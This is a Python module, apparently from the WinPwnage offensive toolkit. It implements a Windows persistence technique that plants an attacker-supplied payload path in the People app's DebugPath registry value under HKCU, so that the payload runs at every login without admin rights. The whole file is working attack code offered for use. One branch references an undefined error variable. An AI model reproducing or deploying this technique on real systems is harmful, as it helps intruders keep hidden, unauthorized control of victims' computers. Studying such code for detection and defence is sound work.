try:
	import _winreg   # Python 2
except ImportError:      # Python 3
	import winreg as _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/

persistMethod10_info = {
	"Description": "Persistence using People windows app",
	"Method": "Registry key (Class) manipulation",
	"Id": "10",
	"Type": "Persistence",
	"Fixed In": "99999",
	"Works From": "14393",
	"Admin": False,
	"Function Name": "persistMethod10",
	"Function Payload": True,
}

def find_people():
	index = 0
	people_version = []
	
	try:
		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
								"Software\Classes\ActivatableClasses\Package",
								0,
								_winreg.KEY_READ)
	except Exception as error:
		print_error("Unable to open registry key, exception was raised: {}".format(error))
		return False

	try:
		num = _winreg.QueryInfoKey(key)[0]
		for x in range(0, num):
			if "Microsoft.People_" in _winreg.EnumKey(key, x):
				people_version.append(_winreg.EnumKey(key, x))
				break
	except WindowsError as error:
		pass
		
	return people_version

def persistMethod10(payload, add=True):
	try:
		kpath = os.path.join("Software\Classes\ActivatableClasses\Package",
								find_people()[0],
								"DebugInformation\\x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x.AppX368sbpk1kx658x0p332evjk2v0y02kxp.mca")
	except IndexError:
		print_error("Unable to add persistence, People app is unavailable on this system")
		return False

	if add:
		if payloads().exe(payload):
			if registry().modify_key(hkey="hkcu", path=kpath, name="DebugPath", value=payloads().exe(payload)[1], create=True):
				print_success("Successfully created DebugPath key containing payload ({payload})".format(payload=payloads().exe(payload)[1]))
				print_success("Successfully installed persistence, payload will run at login")
			else:
				print_error("Unable to add persistence, exception was raised: {}".format(error))
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hkcu", path=kpath, name="DebugPath"):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False
